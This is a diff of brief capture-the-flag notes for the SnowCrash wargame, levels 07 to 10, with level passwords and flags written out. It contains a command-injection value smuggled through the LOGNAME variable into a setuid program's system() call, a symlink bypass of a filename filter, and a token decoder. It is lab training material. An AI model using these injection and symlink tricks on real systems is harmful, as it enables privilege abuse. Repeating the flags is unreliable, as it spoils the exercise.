@@ -100,9 +100,56 @@ level06 -> viuaaale9huek52boumoomioc
 	flag06 -> X
 
 level07 -> wiok45aaoguiboiki2tuin6ub
+	permissions s
+	run with ltrace
+	>
+	getenv("LOGNAME") = "level07"
+	asprintf(0xbffff744, 0x8048688, 0xbfffff48, 0xb7e5ee55, 0xb7fed280) = 18
+	system("/bin/echo level07 ")
+	<
+	export LOGNAME="; getflag;"
+	run
+
+	flag07 -> X
+
+level08 -> fiumuikeil55xe9cu4dood66h
+	permissions s
+	run -> file to read
+	echo bonjour > /tmp/bonjour; ./level08 /tmp/bonjour
+	ltrace ./level08 /tmp/bonjour
+	ltrace ./level08 token
+	-> filter by name with strstr
+	ln -s ~/token /tmp/boken
+	./level08 /tmp/boken
+
+	flag08 -> quif5eloekouj29ke0vouxean
+
+level09 -> 25749xKZ8L7DkSCwJkT9dyv6f
+	run with "aaaaaaaaaa" argument
+	-> abcdefghij
+	cat token -> code to decode
+	create decoder.c
+	>
+	int main(void) {
+		int i = 0;
+		char c = 0;
+
+		for (i = 0; read(0, &c, 1) > 0; ++i) {
+			printf("%c", c - i);
+		}
+		printf("\n");
+		return (0);
+	}
+	<
+	scp -P 4242 decoder.c level09@192.168.1.16:/tmp
+	gcc -Wall -Wextra /tmp/decoder.c -o /tmp/decoder
+	cat /home/user/level09 | /tmp/decoder
 	
-in gdb
+	flag09 -> f3iji1ju5yuevaus41q1afiuq
+
+level10 -> s5cAJpM8ev6XHw998pRWG728z
+
+	in gdb
 	break system
 	x/1s 0x080485e0
-
 mkisofs -o SnowCrash_mod.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V "Custom SnowCrash Iso" ../SnowCrash
